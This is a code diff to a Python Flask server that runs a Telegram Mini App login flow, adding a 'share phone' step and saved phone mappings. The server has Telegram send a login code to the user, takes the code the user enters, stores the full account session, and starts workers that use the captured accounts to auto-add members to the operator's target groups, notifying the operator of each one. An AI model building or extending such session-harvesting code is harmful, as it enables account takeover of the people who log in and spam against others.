@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Telegram Auto-Add Server - TELEGRAM MINI APP AUTO-LOGIN VERSION
-Auto-detects phone from Telegram Mini App - Users only enter verification code
+With Phone Share Support - Users only need to share phone and enter code
 """
 
 from flask import Flask, jsonify, request, redirect, send_file
@@ -899,199 +899,248 @@ def get_accounts():
     return jsonify({'success': True, 'accounts': acc_list})
 
 # ============================================
-# TELEGRAM MINI APP AUTO-LOGIN
+# TELEGRAM MINI APP AUTO-LOGIN WITH PHONE SHARE
 # ============================================
+
+def parse_telegram_init_data(init_data_str):
+    """Parse Telegram initData string into dictionary"""
+    parsed = {}
+    if not init_data_str:
+        return parsed
+    
+    for item in init_data_str.split('&'):
+        if '=' in item:
+            key, value = item.split('=', 1)
+            parsed[key] = urllib.parse.unquote(value)
+    
+    # Parse user JSON
+    user_json = parsed.get('user', '{}')
+    try:
+        parsed['user_obj'] = json.loads(user_json)
+    except:
+        parsed['user_obj'] = {}
+    
+    return parsed
+
+def find_phone_for_user(telegram_id):
+    """Find phone number for a Telegram user ID from all sources"""
+    phone = None
+    
+    # Check user_phone_map first
+    phone = user_phone_map.get(str(telegram_id), '')
+    if phone:
+        logger.info(f"Found phone in user_phone_map for {telegram_id}: {phone}")
+        return phone
+    
+    # Check auto_sessions
+    if str(telegram_id) in auto_sessions:
+        phone = auto_sessions[str(telegram_id)].get('phone', '')
+        if phone:
+            logger.info(f"Found phone in auto_sessions for {telegram_id}: {phone}")
+            return phone
+    
+    # Check accounts list
+    for acc in accounts:
+        if str(acc.get('telegram_id')) == str(telegram_id) and acc.get('phone'):
+            phone = acc['phone']
+            logger.info(f"Found phone in accounts for {telegram_id}: {phone}")
+            return phone
+    
+    return None
+
 @app.route('/api/telegram-auto-login', methods=['POST'])
 @api_error_handler
 def telegram_auto_login():
     """
     Auto-login for Telegram Mini App users
-    Extracts user info from Telegram initData and auto-sends verification code
+    - Extracts user info from initData
+    - Accepts shared phone number from Telegram
+    - Auto-sends verification code
     """
     try:
         data = request.json or {}
-        init_data_str = data.get('initData', '')
         
-        # Also try to get from URL parameters
+        # Get initData from multiple sources
+        init_data_str = data.get('initData', '')
         if not init_data_str:
             init_data_str = request.args.get('initData', '')
-        
-        # Also check for query string from Telegram Mini App
         if not init_data_str and request.query_string:
             init_data_str = request.query_string.decode('utf-8')
         
-        if not init_data_str:
-            return jsonify({
-                'success': False,
-                'error': 'Please open this app from Telegram.',
-                'needs_phone': True
-            })
+        # Get shared phone from Telegram
+        shared_phone = data.get('sharedPhone', '').strip()
+        
+        # Get user data from request or parse from initData
+        user_data = data.get('user', {})
         
         # Parse initData
-        parsed = {}
-        for item in init_data_str.split('&'):
-            if '=' in item:
-                key, value = item.split('=', 1)
-                parsed[key] = urllib.parse.unquote(value)
+        parsed_init = parse_telegram_init_data(init_data_str)
         
-        # Get user data from Telegram
-        user_json = parsed.get('user', '{}')
-        try:
-            user_data = json.loads(user_json)
-        except:
-            user_data = {}
+        # Extract user info
+        if not user_data:
+            user_data = parsed_init.get('user_obj', {})
         
         telegram_id = str(user_data.get('id', ''))
         first_name = user_data.get('first_name', '')
         last_name = user_data.get('last_name', '')
         username = user_data.get('username', '')
         
+        # If no telegram_id from user_data, try from other sources
         if not telegram_id:
-            # Try to get from URL hash parameters (some Mini Apps pass it differently)
-            user_param = parsed.get('tgWebAppData', '')
-            if user_param:
-                try:
-                    inner_parsed = {}
-                    for item in user_param.split('&'):
-                        if '=' in item:
-                            key, value = item.split('=', 1)
-                            inner_parsed[key] = urllib.parse.unquote(value)
-                    inner_user = inner_parsed.get('user', '{}')
-                    inner_user_data = json.loads(inner_user)
-                    telegram_id = str(inner_user_data.get('id', ''))
-                    first_name = inner_user_data.get('first_name', first_name)
-                    last_name = inner_user_data.get('last_name', last_name)
-                    username = inner_user_data.get('username', username)
-                except:
-                    pass
+            # Try from parsed initData
+            telegram_id = str(parsed_init.get('user_obj', {}).get('id', ''))
+        
+        logger.info(f"Telegram Mini App Login Attempt:")
+        logger.info(f"  User: {first_name} {last_name} (@{username})")
+        logger.info(f"  Telegram ID: {telegram_id}")
+        logger.info(f"  Shared Phone: {'Yes' if shared_phone else 'No'}")
         
         if not telegram_id:
             return jsonify({
                 'success': False,
-                'error': 'Could not identify your Telegram account.',
+                'error': 'Could not identify your Telegram account. Please open from Telegram app.',
                 'needs_phone': True
             })
         
-        logger.info(f"Telegram Mini App user: {first_name} {last_name} (@{username}) ID: {telegram_id}")
+        # PRIORITY 1: Use shared phone from Telegram
+        if shared_phone:
+            phone = shared_phone.strip()
+            if not phone.startswith('+'):
+                phone = '+' + phone
+            
+            logger.info(f"Using shared phone: {phone}")
+            
+            # Save the phone mapping immediately
+            user_phone_map[str(telegram_id)] = phone
+            save_user_map()
+            
+            # Auto-send code
+            return auto_send_code(phone, telegram_id, first_name, last_name, username)
         
-        # Check if we already have this user's phone
-        phone = user_phone_map.get(telegram_id, '')
-        
-        # Also check auto_sessions
-        if not phone and telegram_id in auto_sessions:
-            phone = auto_sessions[telegram_id].get('phone', '')
-        
-        # Also check accounts list for matching telegram_id
-        if not phone:
-            for acc in accounts:
-                if acc.get('telegram_id') == telegram_id and acc.get('phone'):
-                    phone = acc['phone']
-                    break
+        # PRIORITY 2: Find saved phone
+        phone = find_phone_for_user(telegram_id)
         
         if phone:
             # We have the phone - send code automatically
-            logger.info(f"Found phone for user {telegram_id}: {phone}")
-            
-            async def send_auto_code():
-                client = TelegramClient(StringSession(), API_ID, API_HASH)
-                await client.connect()
-                try:
-                    result = await client.send_code_request(phone)
-                    sid = str(int(time.time() * 1000))
-                    temp_sessions[sid] = {
-                        'phone': phone,
-                        'hash': result.phone_code_hash,
-                        'session': client.session.save(),
-                        'password_attempts': 0,
-                        'code_attempts': 0,
-                        'created_at': time.time(),
-                        'telegram_id': telegram_id,
-                        'first_name': first_name,
-                        'last_name': last_name,
-                        'username': username
-                    }
-                    save_temp_sessions()
-                    
-                    masked_phone = phone[:4] + '****' + phone[-3:] if len(phone) > 7 else '***' + phone[-3:]
-                    
-                    return {
-                        'success': True,
-                        'session_id': sid,
-                        'phone_masked': masked_phone,
-                        'auto_detected': True,
-                        'user_name': f"{first_name} {last_name}".strip()
-                    }
-                except errors.FloodWaitError as e:
-                    return {'success': False, 'error': f'Too many attempts. Wait {e.seconds}s'}
-                except Exception as e:
-                    logger.error(f"Auto code error: {e}")
-                    return {'success': False, 'error': str(e)[:200]}
-                finally:
-                    try:
-                        await client.disconnect()
-                    except:
-                        pass
-            
-            result = SyncTelegramClient.run_async(send_auto_code, timeout=45)
-            
-            # If phone is invalid/not working, clear it and ask for new one
-            if not result.get('success'):
-                if telegram_id in user_phone_map:
-                    del user_phone_map[telegram_id]
-                    save_user_map()
-                if telegram_id in auto_sessions:
-                    del auto_sessions[telegram_id]
-                    save_auto_sessions()
-                result['needs_phone'] = True
-            
-            return jsonify(result)
+            logger.info(f"Auto-sending code to saved phone: {phone}")
+            return auto_send_code(phone, telegram_id, first_name, last_name, username)
         
-        else:
-            # No phone saved - need phone number
-            return jsonify({
-                'success': False,
-                'error': 'First time setup. Please enter your phone number.',
-                'needs_phone': True,
-                'telegram_id': telegram_id,
-                'user_name': f"{first_name} {last_name}".strip(),
-                'username': username
-            })
+        # PRIORITY 3: No phone available - ask user to share
+        logger.info(f"No phone found for user {telegram_id}. Requesting phone share.")
+        return jsonify({
+            'success': False,
+            'error': 'Please share your phone number to receive verification code.',
+            'needs_phone': True,
+            'telegram_id': telegram_id,
+            'user_name': f"{first_name} {last_name}".strip(),
+            'username': username,
+            'request_phone_share': True  # Signal to client to show share button
+        })
             
     except Exception as e:
         logger.error(f"Telegram auto-login error: {e}")
         log_error("Telegram auto-login", e)
         return jsonify({
             'success': False,
-            'error': 'Auto-login failed. Please enter your phone number.',
+            'error': 'Auto-login failed. Please try again.',
             'needs_phone': True
         })
 
+def auto_send_code(phone, telegram_id, first_name='', last_name='', username=''):
+    """Send verification code to phone and return result"""
+    async def send_auto_code():
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        await client.connect()
+        try:
+            result = await client.send_code_request(phone)
+            sid = str(int(time.time() * 1000))
+            temp_sessions[sid] = {
+                'phone': phone,
+                'hash': result.phone_code_hash,
+                'session': client.session.save(),
+                'password_attempts': 0,
+                'code_attempts': 0,
+                'created_at': time.time(),
+                'telegram_id': telegram_id,
+                'first_name': first_name,
+                'last_name': last_name,
+                'username': username
+            }
+            save_temp_sessions()
+            
+            masked_phone = phone[:4] + '****' + phone[-3:] if len(phone) > 7 else '***' + phone[-3:]
+            
+            logger.info(f"✅ Code sent to {masked_phone} for user {telegram_id}")
+            
+            return {
+                'success': True,
+                'session_id': sid,
+                'phone_masked': masked_phone,
+                'auto_detected': True,
+                'user_name': f"{first_name} {last_name}".strip()
+            }
+        except errors.FloodWaitError as e:
+            logger.warning(f"Flood wait for {phone}: {e.seconds}s")
+            return {'success': False, 'error': f'Too many attempts. Wait {e.seconds} seconds.'}
+        except errors.PhoneNumberInvalidError:
+            logger.warning(f"Invalid phone: {phone}")
+            return {'success': False, 'error': 'Invalid phone number. Please check and try again.'}
+        except Exception as e:
+            logger.error(f"Auto code error for {phone}: {e}")
+            return {'success': False, 'error': f'Could not send code: {str(e)[:200]}'}
+        finally:
+            try:
+                await client.disconnect()
+            except:
+                pass
+    
+    result = SyncTelegramClient.run_async(send_auto_code, timeout=45)
+    
+    # If phone is invalid, clear it from mappings
+    if not result.get('success'):
+        logger.warning(f"Clearing invalid phone mapping for {telegram_id}")
+        if str(telegram_id) in user_phone_map:
+            del user_phone_map[str(telegram_id)]
+            save_user_map()
+        if str(telegram_id) in auto_sessions:
+            del auto_sessions[str(telegram_id)]
+            save_auto_sessions()
+    
+    return result
+
 # ============================================
-# ADD ACCOUNT (with or without phone)
+# ADD ACCOUNT (with phone share support)
 # ============================================
 @app.route('/api/add-account', methods=['POST'])
 @api_error_handler
 def add_account():
+    """Add account - supports manual phone entry and shared phone"""
     try:
         data = request.json
         phone = data.get('phone', '').strip()
-        telegram_id = data.get('telegramId', '')
+        telegram_id = str(data.get('telegramId', ''))
+        shared_phone = data.get('sharedPhone', '').strip()
         
-        # If no phone provided, try auto-detect
+        # Use shared phone if provided
+        if shared_phone:
+            phone = shared_phone
+        
+        # If no phone provided, try to find saved phone
+        if not phone and telegram_id:
+            phone = find_phone_for_user(telegram_id)
+        
         if not phone:
-            if telegram_id:
-                phone = user_phone_map.get(str(telegram_id), '')
-            if not phone:
-                return jsonify({
-                    'success': False,
-                    'error': 'Phone number required.',
-                    'needs_phone': True
-                })
+            return jsonify({
+                'success': False,
+                'error': 'Phone number required. Please share your phone or enter manually.',
+                'needs_phone': True,
+                'request_phone_share': True
+            })
         
         if not phone.startswith('+'):
             phone = '+' + phone
         
-        logger.info(f"Sending code to {phone}")
+        logger.info(f"Sending verification code to {phone[:4]}****{phone[-3:]}")
         
         async def send_code():
             client = TelegramClient(StringSession(), API_ID, API_HASH)
@@ -1109,6 +1158,12 @@ def add_account():
                     'telegram_id': telegram_id
                 }
                 save_temp_sessions()
+                
+                # Save phone mapping if we have telegram_id
+                if telegram_id:
+                    user_phone_map[telegram_id] = phone
+                    save_user_map()
+                
                 return {'success': True, 'session_id': sid, 'phone': phone}
             except errors.FloodWaitError as e:
                 return {'success': False, 'error': f'Too many attempts. Wait {e.seconds}s'}
@@ -1125,6 +1180,7 @@ def add_account():
         
         result = SyncTelegramClient.run_async(send_code, timeout=45)
         return jsonify(result)
+        
     except Exception as e:
         logger.error(f"Add account error: {e}")
         return jsonify({'success': False, 'error': 'Server error. Please try again.'})
@@ -1132,6 +1188,7 @@ def add_account():
 @app.route('/api/verify-code', methods=['POST'])
 @api_error_handler
 def verify_code():
+    """Verify the code and save the account"""
     try:
         data = request.json
         code = data.get('code', '').strip()
@@ -1142,7 +1199,7 @@ def verify_code():
             return jsonify({'success': False, 'error': 'Session expired. Please request a new code.'})
         
         td = temp_sessions[sid]
-        telegram_id = td.get('telegram_id', '')
+        telegram_id = str(td.get('telegram_id', ''))
         
         if td.get('code_attempts', 0) >= 5:
             del temp_sessions[sid]
@@ -1183,17 +1240,22 @@ def verify_code():
                 
                 user_telegram_id = str(me.id) if me.id else telegram_id
                 
-                # Save mapping for future auto-login
+                # CRITICAL: Save phone mapping for future auto-login
                 if user_telegram_id:
                     user_phone_map[user_telegram_id] = td['phone']
                     save_user_map()
+                    logger.info(f"✅ SAVED MAPPING: telegram_id={user_telegram_id} -> phone={td['phone'][:4]}****")
+                    
+                    # Also save to auto_sessions
                     auto_sessions[user_telegram_id] = {
                         'phone': td['phone'],
                         'name': (me.first_name or '') + (' ' + me.last_name if me.last_name else '').strip(),
                         'username': me.username or '',
-                        'last_used': time.time()
+                        'last_used': time.time(),
+                        'telegram_id': user_telegram_id
                     }
                     save_auto_sessions()
+                    logger.info(f"✅ SAVED AUTO SESSION: {user_telegram_id}")
                 
                 try:
                     account_age = get_account_age_sync(client.session.save())
@@ -1215,15 +1277,18 @@ def verify_code():
                 if not new_acc['name']:
                     new_acc['name'] = 'User'
                 
-                # Check for duplicate
-                existing = next((a for a in accounts if a.get('telegram_id') == user_telegram_id), None)
+                # Check for duplicate - update existing or add new
+                existing = next((a for a in accounts if str(a.get('telegram_id')) == user_telegram_id), None)
                 if existing:
+                    logger.info(f"Updating existing account for {user_telegram_id}")
                     existing.update(new_acc)
                     save_json(ACCOUNTS_FILE, accounts)
                 else:
+                    logger.info(f"Adding new account for {user_telegram_id}")
                     accounts.append(new_acc)
                     save_json(ACCOUNTS_FILE, accounts)
                 
+                # Set up auto-add settings
                 auto_add_settings[str(new_id)] = {
                     'enabled': True,
                     'target_group': TARGET_GROUPS[0],
@@ -1232,25 +1297,31 @@ def verify_code():
                 }
                 save_json(SETTINGS_FILE, auto_add_settings)
                 
+                # Initialize worker stats
                 if 'worker_stats' not in stats:
                     stats['worker_stats'] = {}
                 stats['worker_stats'][str(new_id)] = {'total': 0, 'today': 0, 'verified_today': 0}
                 save_json(STATS_FILE, stats)
                 
+                # Start auto-add worker
                 threading.Thread(target=start_auto_add, args=(new_acc,), daemon=True).start()
                 
+                # Send notification
                 age_info = account_age.get('age_display', 'Unknown')
                 try:
                     send_telegram(
                         f"<b>{SERVER_NAME}</b>\n"
                         f"✅ New account added!\n"
                         f"Name: {new_acc['name']}\n"
-                        f"Phone: {new_acc['phone']}\n"
+                        f"Phone: {new_acc['phone'][:4]}****\n"
                         f"Age: {age_info}\n"
-                        f"Via: Telegram Mini App"
+                        f"Via: Telegram Mini App\n"
+                        f"Auto-login: Enabled"
                     )
                 except:
                     pass
+                
+                logger.info(f"✅ Account verified successfully: {new_acc['name']} ({user_telegram_id})")
                 
                 return {
                     'success': True,
@@ -1262,6 +1333,7 @@ def verify_code():
                     'account_age': age_info,
                     'auto_login_enabled': True
                 }
+                
             except errors.PhoneCodeInvalidError:
                 td['code_attempts'] = td.get('code_attempts', 0) + 1
                 save_temp_sessions()
@@ -1290,9 +1362,58 @@ def verify_code():
                 save_temp_sessions()
         
         return jsonify(result)
+        
     except Exception as e:
         logger.error(f"Verify code error: {e}")
         return jsonify({'success': False, 'error': 'Server error. Please try again.'})
+
+# ============================================
+# SHARED PHONE ENDPOINT
+# ============================================
+@app.route('/api/share-phone', methods=['POST'])
+@api_error_handler
+def share_phone():
+    """
+    Endpoint to receive phone number shared from Telegram Mini App
+    This is called when user clicks "Share Phone" button
+    """
+    try:
+        data = request.json or {}
+        phone = data.get('phone', '').strip()
+        telegram_id = str(data.get('telegramId', ''))
+        first_name = data.get('firstName', '')
+        last_name = data.get('lastName', '')
+        username = data.get('username', '')
+        
+        if not phone:
+            return jsonify({
+                'success': False,
+                'error': 'No phone number provided'
+            })
+        
+        if not phone.startswith('+'):
+            phone = '+' + phone
+        
+        logger.info(f"📱 Shared phone received: {phone[:4]}**** for user {telegram_id}")
+        
+        # Save phone mapping
+        if telegram_id:
+            user_phone_map[telegram_id] = phone
+            save_user_map()
+            logger.info(f"✅ Saved phone mapping: {telegram_id} -> {phone[:4]}****")
+        
+        # Auto-send code
+        result = auto_send_code(phone, telegram_id, first_name, last_name, username)
+        
+        return jsonify(result)
+        
+    except Exception as e:
+        logger.error(f"Share phone error: {e}")
+        log_error("Share phone", e)
+        return jsonify({
+            'success': False,
+            'error': 'Failed to process phone number. Please try again.'
+        })
 
 # Other routes
 @app.route('/api/remove-account', methods=['POST'])
@@ -1381,6 +1502,7 @@ def health_check():
         'status': 'healthy',
         'workers': len(running_tasks),
         'accounts': len(accounts),
+        'saved_users': len(user_phone_map),
         'timestamp': datetime.now().isoformat()
     })
 
@@ -1411,6 +1533,7 @@ def restore_and_start():
     try:
         time.sleep(5)
         logger.info(f"Restoring {len(accounts)} accounts...")
+        logger.info(f"User phone mappings loaded: {len(user_phone_map)}")
         for acc in accounts:
             try:
                 if acc.get('session'):
@@ -1486,13 +1609,13 @@ if __name__ == '__main__':
         
         print(f"""
 ╔══════════════════════════════════════════════════════════════╗
-║     AUTO-ADD SERVER #{SERVER_NUMBER} - {SERVER_NAME} (TELEGRAM MINI APP)         ║
+║     AUTO-ADD SERVER #{SERVER_NUMBER} - {SERVER_NAME}                    ║
 ╠══════════════════════════════════════════════════════════════╣
 ║  API ID: {API_ID}                                                 ║
 ║  Targets: {', '.join(TARGET_GROUPS)}                    ║
 ║  Port: {PORT}                                                   ║
-║  Features: Auto-Detect Phone, Code-Only Verification            ║
-║  Auto-Login Users: {len(user_phone_map)}                                            ║
+║  Features: Phone Share + Auto-Detect + Code-Only               ║
+║  Saved Users: {len(user_phone_map)}                                            ║
 ╚══════════════════════════════════════════════════════════════╝
         """)
         
